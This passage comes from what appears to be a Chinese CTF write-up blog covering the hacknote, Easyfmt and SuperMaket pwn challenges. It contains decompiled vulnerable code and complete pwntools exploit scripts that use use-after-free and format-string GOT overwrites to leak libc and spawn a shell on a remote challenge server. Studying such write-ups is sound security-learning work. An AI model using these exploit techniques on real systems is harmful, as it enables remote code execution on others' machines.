<h2 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h2><h3 id="获取libc基址"><a href="#获取libc基址" class="headerlink" title="获取libc基址"></a>获取libc基址</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">ad(<span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;A&#x27;</span>)<br>ad(<span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;B&#x27;</span>)<br>rm(<span class="hljs-number">0</span>)<br>rm(<span class="hljs-number">1</span>)<br><br>dump_addr = <span class="hljs-number">0x0804862B</span><br>ad(<span class="hljs-number">0x8</span>, p32(dump_addr) + p32(exe.got[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br>dp(<span class="hljs-number">0</span>)<br>puts_addr = u32(r(<span class="hljs-number">4</span>))<br>li(<span class="hljs-string">&#x27;puts_addr: &#x27;</span> + <span class="hljs-built_in">hex</span>(puts_addr))<br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>, puts_addr)<br>libc_base = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>sys_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br></code></pre></td></tr></table></figure>

<h3 id="getshell-1"><a href="#getshell-1" class="headerlink" title="getshell"></a>getshell</h3><p>通过修改函数指针为system获得shell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># get shell</span><br>rm(<span class="hljs-number">2</span>)<br>ad(<span class="hljs-number">0x8</span>, p32(sys_addr) + <span class="hljs-string">&#x27;; sh&#x27;</span>)<br>dp(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>





<h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><br><span class="hljs-comment"># Author: I0gan</span><br><span class="hljs-comment"># Team  : D0g3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]</span><br><span class="hljs-comment">#context.terminal = &#x27;konsole&#x27;</span><br><br><span class="hljs-comment">#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="hljs-comment">#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><br>exeFile  = <span class="hljs-string">&quot;hacknote&quot;</span><br>libFile  = <span class="hljs-string">&quot;&quot;</span><br><br>remoteIp = <span class="hljs-string">&quot;111.198.29.45&quot;</span><br>remotePort = <span class="hljs-number">32693</span><br><br>LOCAL = <span class="hljs-number">0</span><br>LIB   = <span class="hljs-number">0</span><br><br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>ra  =  <span class="hljs-keyword">lambda</span>   : io.recvall()<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">True</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>pd32  = <span class="hljs-keyword">lambda</span> x : p32(x).decode() <span class="hljs-comment">#python3 not surport str + bytes</span><br>pd64  = <span class="hljs-keyword">lambda</span> x : p64(x).decode()<br>li    = <span class="hljs-keyword">lambda</span> x : log.info(x)<br>db    = <span class="hljs-keyword">lambda</span>   : gdb.attach(io)<br><br><span class="hljs-comment">#--------------------------Func-----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ad</span>(<span class="hljs-params">size, text</span>):<br>	sa(<span class="hljs-string">&#x27;Your choice :&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>	sa(<span class="hljs-string">&#x27;Note size :&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>	sa(<span class="hljs-string">&#x27;Content :&#x27;</span>, text)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rm</span>(<span class="hljs-params">index</span>):<br>	sa(<span class="hljs-string">&#x27;Your choice :&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>	sa(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dp</span>(<span class="hljs-params">index</span>):<br>	sa(<span class="hljs-string">&#x27;Your choice :&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>	sa(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(index))	<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">q</span>():<br>	sa(<span class="hljs-string">&#x27;Your choice :&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br><br><span class="hljs-comment">#--------------------------Exploit--------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>	<span class="hljs-comment">#li(rl())</span><br>	ad(<span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;A&#x27;</span>)<br>	ad(<span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;B&#x27;</span>)<br>	rm(<span class="hljs-number">0</span>)<br>	rm(<span class="hljs-number">1</span>)<br><br>	dump_addr = <span class="hljs-number">0x0804862B</span><br>	ad(<span class="hljs-number">0x8</span>, p32(dump_addr) + p32(exe.got[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br>	dp(<span class="hljs-number">0</span>)<br>	puts_addr = u32(r(<span class="hljs-number">4</span>))<br>	li(<span class="hljs-string">&#x27;puts_addr: &#x27;</span> + <span class="hljs-built_in">hex</span>(puts_addr))<br>	libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>, puts_addr)<br>	libc_base = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>	sys_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>	<span class="hljs-comment"># get shell</span><br>	rm(<span class="hljs-number">2</span>)<br>	ad(<span class="hljs-number">0x8</span>, p32(sys_addr) + <span class="hljs-string">&#x27;; sh&#x27;</span>)<br>	dp(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>():<br>	ia()<br>	c()<br><br><span class="hljs-comment">#--------------------------Main-----------------------------</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	<br>	<span class="hljs-keyword">if</span> LOCAL:<br>		exe = ELF(exeFile)<br>		<span class="hljs-keyword">if</span> LIB:<br>			lib = ELF(libFile)<br>			io = exe.process(env = &#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libFile&#125;)<br>		<span class="hljs-keyword">else</span>:<br>			io = exe.process()<br>	<br>	<span class="hljs-keyword">else</span>:<br>		exe = ELF(exeFile)<br>		io = remote(remoteIp, remotePort)<br>		<span class="hljs-keyword">if</span> LIB:<br>			lib = ELF(libFile)<br>	<br>	exploit()<br>	finish()<br></code></pre></td></tr></table></figure>



<h1 id="Easyfmt"><a href="#Easyfmt" class="headerlink" title="Easyfmt"></a>Easyfmt</h1><h2 id="来源-1"><a href="#来源-1" class="headerlink" title="来源"></a>来源</h2><p>攻防世界</p>
<h2 id="vul-2"><a href="#vul-2" class="headerlink" title="vul"></a>vul</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> buf; <span class="hljs-comment">// [rsp+10h] [rbp-110h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+118h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  setvbuf(_bss_start, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;welcome to haerbin~&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)CheckIn() == <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-built_in">memset</span>(&amp;buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x100</span>uLL);<br>    write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;slogan: &quot;</span>, <span class="hljs-number">9uLL</span>);<br>    read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x100</span>uLL);<br>    <span class="hljs-built_in">printf</span>(&amp;buf, &amp;buf, argv); <span class="hljs-comment">//fmt vul</span><br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;bye~&quot;</span>);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);                                      <span class="hljs-comment">// modify this</span><br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>这是一个有概率的题,需要多打几次, 概率绕过第一个后, 通过fmt漏洞修改exit的got表实现循环利用,然后泄漏__libc_start_main获取libc基址, 获取system地址后, 然后再partial write修改printf的got为system地址</p>
<h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><br><span class="hljs-comment"># Author: I0gan</span><br><span class="hljs-comment"># Team  : D0g3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br><br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br><span class="hljs-comment">#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]</span><br><span class="hljs-comment">#context.terminal = &#x27;konsole&#x27;</span><br><span class="hljs-comment">#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>exeFile  = <span class="hljs-string">&quot;easyfmt&quot;</span><br>libFile  = <span class="hljs-string">&quot;&quot;</span><br><br>remoteIp = <span class="hljs-string">&quot;111.198.29.45&quot;</span><br>remotePort = <span class="hljs-number">53453</span><br><br>LOCAL = <span class="hljs-number">0</span><br>LIB   = <span class="hljs-number">0</span><br><span class="hljs-comment">#  ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)</span><br><br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>ra  =  <span class="hljs-keyword">lambda</span>   : io.recvall()<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">True</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>s   =  <span class="hljs-keyword">lambda</span> x : io.send(x)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>pd32  = <span class="hljs-keyword">lambda</span> x : p32(x).decode() <span class="hljs-comment">#python3 not surport str + bytes</span><br>pd64  = <span class="hljs-keyword">lambda</span> x : p64(x).decode()<br>li    = <span class="hljs-keyword">lambda</span> x : log.info(x)<br>db    = <span class="hljs-keyword">lambda</span>   : gdb.attach(io)<br><br><span class="hljs-comment">#--------------------------Func-----------------------------</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fmt</span>(<span class="hljs-params">prev, word, index</span>):<br>    <span class="hljs-keyword">if</span> prev &lt; word:<br>        result = word - prev<br>        fmtstr = <span class="hljs-string">&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(result) + <span class="hljs-string">&quot;c&quot;</span><br>    <span class="hljs-keyword">elif</span> prev == word:<br>        result = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">else</span>:<br>        result = <span class="hljs-number">256</span> + word - prev<br>        fmtstr = <span class="hljs-string">&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(result) + <span class="hljs-string">&quot;c&quot;</span><br>    fmtstr += <span class="hljs-string">&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(index) + <span class="hljs-string">&quot;$hhn&quot;</span><br>    <span class="hljs-keyword">return</span> fmtstr<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fmt_str</span>(<span class="hljs-params">offset, size, addr, target</span>):<br>    payload = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        <span class="hljs-keyword">if</span> size == <span class="hljs-number">4</span>:<br>            payload += p32(addr + i)<br>        <span class="hljs-keyword">else</span>:<br>            payload += p64(addr + i)<br>    prev = <span class="hljs-built_in">len</span>(payload)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        payload += fmt(prev, (target &gt;&gt; i * <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>, offset + i)<br>        prev = (target &gt;&gt; i * <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span><br>    <span class="hljs-keyword">return</span> payload<br><br><span class="hljs-comment">#--------------------------Exploit--------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>	li(rl())<br>	p = <span class="hljs-string">&#x27;\x31&#x27;</span> + <span class="hljs-string">&#x27;\x00&#x27;</span> * <span class="hljs-number">9</span><br>	s(p)<br>	ru(<span class="hljs-string">&#x27;:&#x27;</span>)<br>	offset = <span class="hljs-number">10</span><br>	start_addr = <span class="hljs-number">0x400750</span><br>	exit_got   = exe.got[<span class="hljs-string">&#x27;exit&#x27;</span>]<br>	exit_plt   = <span class="hljs-number">0x400720</span><br>	fmt_addr = <span class="hljs-number">0x400982</span><br><br>	<span class="hljs-comment">#leaking libc	</span><br>	fini_array = <span class="hljs-number">0x400a74</span><br>	<span class="hljs-comment">#modify exit got as fmt_start</span><br>	<span class="hljs-comment">#can&#x27;t set addr at front</span><br>	p = <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(fmt_addr &amp; <span class="hljs-number">0xFFFF</span>) + <span class="hljs-string">&#x27;c%10$hn&#x27;</span> + <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">4</span> + p64(exit_got)<br>	li(<span class="hljs-string">&#x27;exit_got: &#x27;</span> + <span class="hljs-built_in">hex</span>(exit_got))<br>	s(p)<br><br>	<span class="hljs-comment">#leaking libc</span><br>	ru(<span class="hljs-string">&#x27;:&#x27;</span>)<br>	p = <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">44</span>) +<span class="hljs-string">&#x27;$p&#x27;</span><br>	s(p)<br>	ru(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>	__libc_start_main = <span class="hljs-built_in">int</span>(r(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">240</span><br>	<span class="hljs-comment">#db()</span><br>	libc = LibcSearcher(<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>, __libc_start_main)<br>	libc_base = __libc_start_main - libc.dump(<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>)<br>	sys_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>	sh_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>	printf_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;printf&#x27;</span>)<br><br>	<span class="hljs-comment">#log</span><br>	li(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>	li(<span class="hljs-string">&#x27;printf_got: &#x27;</span> + <span class="hljs-built_in">hex</span>(exe.got[<span class="hljs-string">&#x27;printf&#x27;</span>]))<br>	li(<span class="hljs-string">&#x27;system_addr: &#x27;</span> + <span class="hljs-built_in">hex</span>(sys_addr))<br>	li(<span class="hljs-string">&#x27;printf_addr: &#x27;</span> + <span class="hljs-built_in">hex</span>(printf_addr))<br><br>	li(<span class="hljs-built_in">hex</span>(<span class="hljs-number">0x550000</span> &gt;&gt; <span class="hljs-number">8</span> * <span class="hljs-number">2</span>))<br>	rb3 = (sys_addr &amp; <span class="hljs-number">0xFF0000</span>) &gt;&gt; (<span class="hljs-number">8</span> * <span class="hljs-number">2</span>)<br>	li(<span class="hljs-string">&#x27;sys_5: &#x27;</span> + <span class="hljs-built_in">hex</span>(rb3))<br><br>	<span class="hljs-comment"># modify printf got addr as system</span><br>	p = <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(rb3) + <span class="hljs-string">&#x27;c%13$hhn&#x27;</span><br>	p +=  <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>((sys_addr &amp; <span class="hljs-number">0xFFFF</span>) - rb3) + <span class="hljs-string">&#x27;c%14$hn&#x27;</span><br><br>	p += p64(exe.got[<span class="hljs-string">&#x27;printf&#x27;</span>] + <span class="hljs-number">2</span>) <span class="hljs-comment">#0xFF0000</span><br>	p += p64(exe.got[<span class="hljs-string">&#x27;printf&#x27;</span>] + <span class="hljs-number">0</span>) <span class="hljs-comment">#0xFFFF</span><br>	<br>	<span class="hljs-comment">#db()</span><br>	s(p)<br>	sl(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>():<br>	ia()<br>	c()<br><br><span class="hljs-comment">#--------------------------Main-----------------------------</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	<br>	<span class="hljs-keyword">if</span> LOCAL:<br>		exe = ELF(exeFile)<br>		<span class="hljs-keyword">if</span> LIB:<br>			lib = ELF(libFile)<br>			io = exe.process(env = &#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libFile&#125;)<br>		<span class="hljs-keyword">else</span>:<br>			io = exe.process()<br>	<br>	<span class="hljs-keyword">else</span>:<br>		exe = ELF(exeFile)<br>		io = remote(remoteIp, remotePort)<br>		<span class="hljs-keyword">if</span> LIB:<br>			lib = ELF(libFile)<br>	<br>	exploit()<br>	finish()<br>    <br></code></pre></td></tr></table></figure>



<h1 id="SuperMaket"><a href="#SuperMaket" class="headerlink" title="SuperMaket"></a>SuperMaket</h1><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点:"></a>漏洞点:</h3><p>添加和删除基本上没有十分严密, 找不到漏洞, 输入的长度且必须是n - 1, 不存在 off by one.然而在修改description的时候,当新的大小与以前大小不同时, 就会realloc重新分配内存.但没有跟新list数组中的指针.若重新分配大的话, 就造成use after free.</p>
<p>简要说一下 realloc函数吧:</p>
<p>extern void *realloc(void *mem_address, unsigned int newsize);</p>
<p>realloc会根据newsize大小来判断怎样分配新的内存, 并却将原来的数据拷贝到新分配的内存中.</p>
<p>realloc包含了 malloc, free, memcpy三个函数功能, 若新的大小过大的时候, 且在相邻chunk没有空间可分配, 这时候,系统就会去找一个空间够的地方来开辟内存, 这时候就可能涉及到这三个函数的功能. malloc新的内存, mcmcpy拷贝数据, free掉以前的chunk.</p>
<h3 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码:"></a>漏洞代码:</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">for</span> ( size = <span class="hljs-number">0</span>; size &lt;= <span class="hljs-number">0</span> || size &gt; <span class="hljs-number">256</span>; size = <span class="hljs-built_in">inputNum</span>() )<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;descrip_size:&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( *((_DWORD *)(&amp;list_0)[v1] + <span class="hljs-number">5</span>) != size )<br>    <span class="hljs-built_in">realloc</span>(*((<span class="hljs-type">void</span> **)(&amp;list_0)[v1] + <span class="hljs-number">6</span>), size); <span class="hljs-comment">//漏洞点</span><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;description:&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">inputName</span>(*((_DWORD *)(&amp;list_0)[v1] + <span class="hljs-number">6</span>), *((_DWORD *)(&amp;list_0)[v1] + <span class="hljs-number">5</span>));<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路:"></a>整体思路:</h3><h4 id="获得libc的基地址"><a href="#获得libc的基地址" class="headerlink" title="获得libc的基地址:"></a>获得libc的基地址:</h4><p>利用这个漏洞来修改free函数的got表为puts, 传入参数为atoi函数的got地址.调用free时, 获得atoi在libc中的地址.计算偏移即可</p>
<h4 id="调用system"><a href="#调用system" class="headerlink" title="调用system."></a>调用system.</h4><p>获得libc地址之后, 也利用这个漏洞修改atoi的got表地址为system地址.然后在进行选择的时候直接传入参数 ‘&#x2F;bin&#x2F;sh’即可获得shell.当然还可以继续修改free的got地址为system.但需要得到’&#x2F;bin&#x2F;sh’在libc中的地址, 且在chunk头的decription地址中写入该地址.调用free也行, 我试过了, system虽然能调用成功, 就是这个’&#x2F;bin&#x2F;sh’在libc中的偏移有问题. 结果 就是sh :cmd not found</p>
<p>以上就是整体思路:</p>
